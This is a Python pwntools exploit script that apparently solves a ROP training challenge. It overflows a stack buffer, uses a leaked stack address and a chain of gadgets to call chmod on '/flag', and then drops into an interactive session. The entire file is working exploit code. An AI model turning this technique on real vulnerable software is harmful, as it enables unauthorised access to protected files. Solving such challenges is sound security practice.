from pwn import *

binary = "/challenge/babyrop_level4.0"
e = context.binary = ELF(binary)

p = process("./babyrop_level4.0")
p.recvuntil("0x")
stack_addr = int(p.recv(12), 16)     # stack leak
info(f"[LEAK] {hex(stack_addr)}")

# chmod(rdi=filename, rsi=mode)
chain = b'A'*120
chain += p64(0x00401c45)            # pop rdi ; ret
chain += p64(stack_addr + 120 + 24) # address of "/flag" on the stack
chain += p64(0x00401016)            # add rsp, 8 to skip our data
chain += b'/flag\0\0\0'
chain += p64(0x00401c4d)            # pop rsi ; ret
chain += p64(0b111)
chain += p64(0x00401c35)            # pop rdx ; ret
chain += p64(0x0)
chain += p64(0x00401c2e)            # pop rax ; ret
chain += p64(0x5A)                  # chmod syscall
chain += p64(0x00401c3d)            # syscall
chain += p64(0x0040101a)            # ret

p.sendline(chain)
p.interactive()
